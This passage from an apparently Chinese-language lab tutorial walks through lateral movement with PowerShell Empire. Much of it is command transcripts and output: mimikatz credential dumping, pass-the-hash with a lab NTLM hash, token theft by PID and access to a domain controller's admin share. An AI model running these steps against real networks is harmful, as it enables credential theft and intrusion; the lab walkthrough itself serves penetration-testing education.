</span></span><span class="line"><span class="cl">│                │            │          │ <span class="o">(</span><span class="s2">&#34;Out-String&#34;</span>, <span class="s2">&#34;ConvertTo-Json&#34;</span>,    │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="s2">&#34;ConvertTo-Csv&#34;</span>, <span class="s2">&#34;ConvertTo-Html&#34;</span>,  │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="s2">&#34;ConvertTo-Xml&#34;</span><span class="o">)</span>.                   │
</span></span><span class="line"><span class="cl">└────────────────┴────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/privesc/gpp<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked D6XC87Y9 to run Task <span class="m">2</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">2</span> results received
</span></span><span class="line"><span class="cl">Job started: KGD9NX
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">2</span> results received
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Get-GPPPassword completed
</span></span></code></pre></div><h2 id="横向渗透">横向渗透</h2>
<h3 id="令牌窃取">令牌窃取</h3>
<blockquote>
<p>本节的环境：攻击机是kali（empire），客户机是Windows7和Windows  server 2019 ，用户分别为sc92n（Windows本地管理员）、testuser（hack的域用户，在域管理组）</p>
</blockquote>
<p>当我们拿到服务器权限，而且是管理员的权限，我们就可以使用内置的mimikatz获取密码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: agents<span class="o">)</span> &gt; interact D6XC87Y9
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: D6XC87Y9<span class="o">)</span> &gt; mimikatz
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked D6XC87Y9 to run Task <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">1</span> results received
</span></span><span class="line"><span class="cl">Job started: BTUVWZ
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">1</span> results received
</span></span><span class="line"><span class="cl">Hostname: WIN-JH8N3KV3OQ0.hack.lab / S-1-5-21-733602728-4270550081-3256311297
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  .#####.   mimikatz 2.2.0 <span class="o">(</span>x64<span class="o">)</span> <span class="c1">#19041 Jun  9 2021 18:55:28</span>
</span></span><span class="line"><span class="cl"> .## ^ <span class="c1">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
</span></span><span class="line"><span class="cl"> <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
</span></span><span class="line"><span class="cl"> <span class="c1">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
</span></span><span class="line"><span class="cl"> <span class="s1">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;#####&#39;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mimikatz<span class="o">(</span>powershell<span class="o">)</span> <span class="c1"># sekurlsa::logonpasswords</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">404157</span> <span class="o">(</span>00000000:00062abd<span class="o">)</span>
</span></span><span class="line"><span class="cl">Session           : RemoteInteractive from <span class="m">2</span>
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">....
</span></span></code></pre></div><p>获取完毕我们可以在<code>credentials</code>中看到列举出的密凭证：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//14.png" alt="14"></p>
<p>我们使用pth模块进行窃取令牌,设置<code>CredID</code>就是刚才凭证列表的ID：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="p">(</span><span class="n">Empire</span><span class="p">:</span><span class="w"> </span><span class="mi">7</span><span class="n">SU3EWKV</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">usemodule</span><span class="w"> </span><span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">pth</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="kt">Set</span><span class="w"> </span><span class="n">Agent</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="mi">7</span><span class="n">SU3EWKV</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Author</span><span class="w">       </span><span class="o">@</span><span class="n">JosephBialek</span><span class="w">                                                        
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="o">@</span><span class="n">gentilkiwi</span><span class="w">                                                          
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Background</span><span class="w">   </span><span class="no">True</span><span class="w">                                                                 
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Comments</span><span class="w">     </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">clymb3r</span><span class="p">.</span><span class="n">wordpress</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="w">                                        
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="p">.</span><span class="n">gentilkiwi</span><span class="p">.</span><span class="n">com</span><span class="w">                                           
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="p">.</span><span class="n">cobaltstrike</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="mi">2015</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="n">how</span><span class="o">-</span><span class="k">to</span><span class="o">-</span><span class="n">pass</span><span class="o">-</span><span class="n">the</span><span class="o">-</span><span class="n">hash</span><span class="o">-</span><span class="k">with</span><span class="o">-</span><span class="w">   
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">mimikatz</span><span class="o">/</span><span class="w">                                                            
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Description</span><span class="w">  </span><span class="n">Runs</span><span class="w"> </span><span class="n">PowerSploit</span><span class="s1">&#39;s Invoke-Mimikatz function to execute sekurlsa::pth 
</span></span></span><span class="line"><span class="cl"><span class="s1">              to create a new process. with a specific user&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">hash</span><span class="p">.</span><span class="w"> </span><span class="k">Use</span><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">credentials</span><span class="o">/</span><span class="n">tokens</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">steal</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="n">afterwards</span><span class="p">.</span><span class="w">                    
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Language</span><span class="w">     </span><span class="n">powershell</span><span class="w">                                                           
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Name</span><span class="w">         </span><span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">pth</span><span class="w">                                  
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">NeedsAdmin</span><span class="w">   </span><span class="no">True</span><span class="w">                                                                 
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">OpsecSafe</span><span class="w">    </span><span class="no">True</span><span class="w">                                                                 
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Software</span><span class="w">     </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">S0002</span><span class="w">                               
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Techniques</span><span class="w">   </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">techniques</span><span class="o">/</span><span class="n">T1098</span><span class="w">                             
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">techniques</span><span class="o">/</span><span class="n">T1003</span><span class="w">                             
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">techniques</span><span class="o">/</span><span class="n">T1081</span><span class="w">                             
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">techniques</span><span class="o">/</span><span class="n">T1207</span><span class="w">                             
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">techniques</span><span class="o">/</span><span class="n">T1075</span><span class="w">                             
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">techniques</span><span class="o">/</span><span class="n">T1097</span><span class="w">                             
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">techniques</span><span class="o">/</span><span class="n">T1145</span><span class="w">                             
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">techniques</span><span class="o">/</span><span class="n">T1101</span><span class="w">                             
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">techniques</span><span class="o">/</span><span class="n">T1178</span><span class="w">                             
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">┌</span><span class="n">Record</span><span class="w"> </span><span class="n">Options</span><span class="err">─────┬──────────┬──────────────────────────────────┐</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">│</span><span class="w"> </span><span class="n">Name</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">Value</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="n">Required</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">Description</span><span class="w">                      </span><span class="err">│</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">├────────┼──────────┼──────────┼──────────────────────────────────┤</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">│</span><span class="w"> </span><span class="n">Agent</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="mi">7</span><span class="n">SU3EWKV</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="no">True</span><span class="w">     </span><span class="err">│</span><span class="w"> </span><span class="n">Agent</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">module</span><span class="w"> </span><span class="k">on</span><span class="p">.</span><span class="w">          </span><span class="err">│</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">├────────┼──────────┼──────────┼──────────────────────────────────┤</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">│</span><span class="w"> </span><span class="n">CredID</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="mi">4</span><span class="w">        </span><span class="err">│</span><span class="w"> </span><span class="no">True</span><span class="w">     </span><span class="err">│</span><span class="w"> </span><span class="n">CredID</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">store</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="err">│</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">│</span><span class="w">        </span><span class="err">│</span><span class="w">          </span><span class="err">│</span><span class="w">          </span><span class="err">│</span><span class="w"> </span><span class="n">ticket</span><span class="w"> </span><span class="n">creation</span><span class="p">.</span><span class="w">                 </span><span class="err">│</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">├────────┼──────────┼──────────┼──────────────────────────────────┤</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">│</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="err">│</span><span class="w">          </span><span class="err">│</span><span class="w"> </span><span class="no">False</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">fully</span><span class="w"> </span><span class="n">qualified</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="n">name</span><span class="p">.</span><span class="w"> </span><span class="err">│</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">├────────┼──────────┼──────────┼──────────────────────────────────┤</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">│</span><span class="w"> </span><span class="n">ntlm</span><span class="w">   </span><span class="err">│</span><span class="w">          </span><span class="err">│</span><span class="w"> </span><span class="no">False</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">NTLM</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">use</span><span class="p">.</span><span class="w">            </span><span class="err">│</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">├────────┼──────────┼──────────┼──────────────────────────────────┤</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">│</span><span class="w"> </span><span class="k">user</span><span class="w">   </span><span class="err">│</span><span class="w">          </span><span class="err">│</span><span class="w"> </span><span class="no">False</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">impersonate</span><span class="p">.</span><span class="w">         </span><span class="err">│</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">└────────┴──────────┴──────────┴──────────────────────────────────┘</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="n">Empire</span><span class="p">:</span><span class="w"> </span><span class="n">usemodule</span><span class="o">/</span><span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">pth</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">CredID</span><span class="w"> </span><span class="mi">4</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="n">Empire</span><span class="p">:</span><span class="w"> </span><span class="n">usemodule</span><span class="o">/</span><span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">pth</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">execute</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Tasked</span><span class="w"> </span><span class="mi">7</span><span class="n">SU3EWKV</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">Task</span><span class="w"> </span><span class="mi">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Task</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">received</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Job</span><span class="w"> </span><span class="n">started</span><span class="p">:</span><span class="w"> </span><span class="mi">86</span><span class="n">ESCA</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Task</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">received</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Hostname</span><span class="p">:</span><span class="w"> </span><span class="n">WIN</span><span class="o">-</span><span class="n">x</span><span class="p">.</span><span class="n">hack</span><span class="p">.</span><span class="n">lab</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">733602728</span><span class="o">-</span><span class="mi">4270550081</span><span class="o">-</span><span class="mi">3256311297</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">.</span><span class="c1">#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="p">.</span><span class="c1">## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="c1">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="s1">&#39;## v ##&#39;</span><span class="w">       </span><span class="n">Vincent</span><span class="w"> </span><span class="n">LE</span><span class="w"> </span><span class="nf">TOUX</span><span class="w">             </span><span class="p">(</span><span class="w"> </span><span class="n">vincent</span><span class="p">.</span><span class="n">letoux</span><span class="o">@</span><span class="n">gmail</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s1">&#39;#####&#39;</span><span class="w">        </span><span class="o">&gt;</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">pingcastle</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">mysmartlogon</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">***/</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">mimikatz</span><span class="p">(</span><span class="n">powershell</span><span class="p">)</span><span class="w"> </span><span class="c1"># sekurlsa::pth /user:testuser /domain:HACK /ntlm:de26cce0356891a4a020e7c4957afc72
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">user</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="n">testuser</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">domain</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="n">HACK</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">program</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">impers</span><span class="p">.</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">no</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">NTLM</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="n">de26cce0356891a4a020e7c4957afc72</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">|</span><span class="w">  </span><span class="n">PID</span><span class="w">  </span><span class="mi">3396</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">|</span><span class="w">  </span><span class="n">TID</span><span class="w">  </span><span class="mi">2204</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">|</span><span class="w">  </span><span class="n">LSA</span><span class="w"> </span><span class="n">Process</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="n">R</span><span class="o">/</span><span class="n">W</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">|</span><span class="w">  </span><span class="n">LUID</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">2380581</span><span class="w"> </span><span class="p">(</span><span class="mi">00000000</span><span class="p">:</span><span class="mi">00245325</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="err">\</span><span class="n">_</span><span class="w"> </span><span class="n">msv1_0</span><span class="w">   </span><span class="o">-</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="mi">0000000001451</span><span class="n">FB0</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">OK</span><span class="w"> </span><span class="o">!</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="err">\</span><span class="n">_</span><span class="w"> </span><span class="n">kerberos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="mi">0000000001752</span><span class="n">A68</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="err">\</span><span class="n">_</span><span class="w"> </span><span class="n">aes256_hmac</span><span class="w">       </span><span class="o">-&gt;</span><span class="w"> </span><span class="no">null</span><span class="w">             
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="err">\</span><span class="n">_</span><span class="w"> </span><span class="n">aes128_hmac</span><span class="w">       </span><span class="o">-&gt;</span><span class="w"> </span><span class="no">null</span><span class="w">             
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="err">\</span><span class="n">_</span><span class="w"> </span><span class="n">rc4_hmac_nt</span><span class="w">       </span><span class="n">OK</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="err">\</span><span class="n">_</span><span class="w"> </span><span class="n">rc4_hmac_old</span><span class="w">      </span><span class="n">OK</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="err">\</span><span class="n">_</span><span class="w"> </span><span class="n">rc4_md4</span><span class="w">           </span><span class="n">OK</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="err">\</span><span class="n">_</span><span class="w"> </span><span class="n">rc4_hmac_nt_exp</span><span class="w">   </span><span class="n">OK</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="err">\</span><span class="n">_</span><span class="w"> </span><span class="n">rc4_hmac_old_exp</span><span class="w">  </span><span class="n">OK</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="err">\</span><span class="n">_</span><span class="w"> </span><span class="o">*</span><span class="n">Password</span><span class="w"> </span><span class="k">replace</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="mi">00000000003</span><span class="nf">BCD88</span><span class="w"> </span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="no">null</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Use</span><span class="w"> </span><span class="n">credentials</span><span class="o">/</span><span class="n">token</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">steal</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">created</span><span class="w"> </span><span class="n">PID</span><span class="p">.</span><span class="w">
</span></span></span></code></pre></div><p>可以看到PID的进程为3396，我们使用<code>steal_token PID</code> 进行利用：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Empire: 7SU3EWKV<span class="o">)</span> &gt; steal_token <span class="m">3396</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7SU3EWKV to run Task <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">10</span> results received
</span></span><span class="line"><span class="cl">Running As: WIN-JH8N3KV3OQ0<span class="se">\s</span>c92n
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Invoke-TokenManipulation completed!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Use credentials/tokens with RevToSelf option to revert token privileges
</span></span></code></pre></div><p>我们进入shell同过刚才窃取的令牌来访问Windows Server 2019 域控主机的目录：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//15.png" alt="15"></p>
<p>当然我们也可以使用查看进程PID来窃取域用户的令牌：</p>
<blockquote>
<p>如果提示错误（我的客户机Windows 7）：</p>
<p><strong>[!] error running command: The term &lsquo;ConvertTo-Json&rsquo; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and t</strong>
ry again.</p>
<p>这个是empire现在还未支持低版本powershell的问题，可以把powershell升级到4.0：https://www.jianshu.com/p/24b98eac766a</p>
</blockquote>
<p>现在我们先恢复令牌的权限：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: 7SU3EWKV<span class="o">)</span> &gt; revtoself
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7SU3EWKV to run Task <span class="m">14</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">14</span> results received
</span></span><span class="line"><span class="cl">RevertToSelf was successful. Running as: WIN-JH8N3KV3OQ0<span class="se">\s</span>c92n
</span></span></code></pre></div><p>当我们再次访问已经提示没有权限了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: 7SU3EWKV<span class="o">)</span> &gt; shell
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exit Shell Menu with Ctrl+C
</span></span><span class="line"><span class="cl"><span class="o">(</span>7SU3EWKV<span class="o">)</span> C:<span class="se">\U</span>sers<span class="se">\s</span>c92n &gt; dir <span class="se">\\</span>dc.hack.lab<span class="se">\c</span>$
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Error: Cannot find path <span class="s1">&#39;\\dc.hack.lab\c$&#39;</span> because it does not exist. <span class="o">(</span>or cannot be accessed<span class="o">)</span>.
</span></span></code></pre></div><p>我们使用ps来查看域用户的PID：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> <span class="m">1480</span>  winlogon       x64   NT AUTHORITY<span class="se">\S</span>YSTEM           2.75 MB   
</span></span><span class="line"><span class="cl"> <span class="m">1576</span>  explorer       x64   WIN-JH8N3KV3OQ0<span class="se">\s</span>c92n         37.05 MB  
</span></span><span class="line"><span class="cl"> <span class="m">1580</span>  svchost        x64   NT AUTHORITY<span class="se">\S</span>YSTEM           2.64 MB   
</span></span><span class="line"><span class="cl"> <span class="m">1680</span>  VGAuthService  x64   NT AUTHORITY<span class="se">\S</span>YSTEM           0.93 MB   
</span></span><span class="line"><span class="cl"> <span class="m">1708</span>  vmtoolsd       x64   NT AUTHORITY<span class="se">\S</span>YSTEM           7.01 MB   
</span></span><span class="line"><span class="cl"> <span class="m">1888</span>  cmd            x64   HACK<span class="se">\t</span>estuser                 2.70 MB   
